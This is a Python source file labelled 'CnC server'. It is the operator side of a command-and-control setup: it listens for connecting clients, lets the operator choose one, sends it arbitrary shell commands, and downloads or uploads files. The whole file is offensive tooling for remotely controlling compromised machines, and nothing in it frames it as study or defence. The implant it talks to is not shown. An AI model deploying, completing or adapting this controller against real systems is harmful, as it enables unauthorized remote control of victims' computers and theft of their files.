# CnC server

#!/usr/bin/env python3

import sys
import socket
from socket import AF_INET, SOCK_STREAM
from common import pr, clear
from common import Send, Receive

# server socket
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

#
dl_fn = ''

def close(sock, client):
  sock.close()
  socks.remove(sock)
  clients.remove(client)
  refresh()

def refresh():
  pr('Listening for clients...')

  if not clients:
    pr('...')
    return

  for i in range(0, len(clients)):
    pr('Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()
  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()
  except KeyboardInterrupt:
    activate = int(input('Enter option: '))
    
    Send(socks[activate], 'activate')
    pr('Activating client ' + str(activate))

    active = True

  while active:
    sock = socks[activate]
    client = clients[activate]

    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)
      close(sock, client)
      break

    if dl_fn:
      try:
        f = open(dl_fn, 'w+b')
      except IOError:
        print('Error opening file')
      f.write(data.encode())
      f.close()
      dl_fn = ''

    if data == 'exit ok':
      active = False
      close(sock, client)
      break

    if not dl_fn:
      sys.stdout.write(data)
    nc = input() # next cmd

    if nc.startswith('download '):
      dl_fn = nc.split(' ')[1]
      
    elif nc.startswith('upload '):
      try:
        f = open(nc.split(' ')[1], 'rb')
      except IOError:
        print('Error opening file')
      d = f.read()
      Send(sock, d, '')
      Send(sock, '')
      f.close()

    Send(sock, nc)
